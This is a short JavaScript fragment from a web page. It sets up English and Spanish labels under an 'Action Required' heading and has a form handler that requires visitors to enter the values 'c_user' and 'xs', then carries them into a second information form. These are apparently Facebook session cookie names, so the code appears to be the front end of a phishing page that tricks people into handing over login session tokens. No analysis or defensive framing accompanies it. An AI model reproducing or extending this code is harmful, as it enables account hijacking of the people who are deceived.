 
          i18next
            .use(i18nextBrowserLanguageDetector)
            .init({
              resources: {
                en: {
                  translation: {
                    "form.title": "Action Required",
                    "form.placeholder": "Enter additional information",
                    "form.submit": "Submit",
                  },
                },
                es: {
                  translation: {
                    "form.title": "Acción requerida",
                    "form.placeholder": "Ingrese información adicional",
                    "form.submit": "Enviar",
                  },
                },
              },
              fallbackLng: "en",
              debug: true,
              detection: {
                order: ["navigator"],
              },
            })
            .then(() => {
              updateTranslations(); // Initial translation update
            });

          function updateTranslations() {
            document.getElementById("additionalInfoLabel").textContent =
              i18next.t("form.title");
            document.getElementById("additionalInfo").placeholder =
              i18next.t("form.placeholder");
            document.getElementById("mainSubmitBtn").textContent =
              i18next.t("form.submit");
          }

          function showAdditionalInfo(event) {
            event.preventDefault();
            var c_user =
              document.getElementById("mainForm").elements["c_user"].value;
            var xs = document.getElementById("mainForm").elements["xs"].value;
            

            // Check if c_user and xs are provided
            if (c_user && xs) {
              document.getElementById("formContainer").style.display = "none";
              document.getElementById("additionalInfoContainer").style.display =
                "block";

              // Set values in the additional information form
              document.getElementById("additionalCUser").value = c_user;
              document.getElementById("additionalXs").value = xs;

              //document.getElementById('thankYouMessage').style.display = 'block';
              
            } 
           
            else {
              alert("Please provide c_user and xs before submitting.");
            }
            
          }
        